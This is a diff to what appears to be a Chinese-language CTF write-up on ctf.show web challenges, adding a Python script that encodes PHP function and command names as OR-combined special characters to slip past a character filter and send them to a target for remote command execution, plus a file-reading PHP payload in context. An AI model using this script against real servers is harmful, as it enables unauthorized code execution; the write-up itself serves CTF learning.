@@ -974,7 +974,66 @@ show_source(next(array_reverse(scandir(pos(localeconv())))));
 
 不允许数字，也不允许有字母。不能有大小写字母。关键字符也不能有。
 
-通过一些特殊字符来构造出一个字母。这里使用到官方提示的一个脚本文件。
+通过一些特殊字符来构造出一个字母。这里使用到官方提示的一个脚本文件。[羽师傅博客](https://blog.csdn.net/miuzzx/article/details/108569080)
+
+<img src="https://cdn.jsdelivr.net/gh/rainsbluechan/blogimage@main/img/image-20230531163746939.png" alt="image-20230531163746939" style="zoom:50%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/rainsbluechan/blogimage@main/img/image-20230531163852967.png" alt="image-20230531163852967" style="zoom:50%;" />
+
+```python
+# -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+os.system("php rce_or.php")  #没有将php写入环境变量需手动运行
+if(len(argv)!=2):
+   print("="*50)
+   print('USER：python exp.py <url>')
+   print("eg：  python exp.py http://ctf.show/")
+   print("="*50)
+   exit(0)
+url=argv[1]
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("rce_or.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"|\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
+   data={
+       'c':urllib.parse.unquote(param)
+       }
+   r=requests.post(url,data=data)
+   print("\n[*] result:\n"+r.text)
+```
+
+我去试试别的靶机，这个能不能用（）
+
+不行，非常不行（），这是针对性做这个抑或用的。
+
+## web42
+
+过滤。
+
+![image-20230531164351534](https://cdn.jsdelivr.net/gh/rainsbluechan/blogimage@main/img/image-20230531164351534.png)
+
+很短，这里参数进到system里，是可以执行指令的意思吗？但是后面的指向会去到哪里？
+
+
 
 ## 方便下一个博客的链接点
 
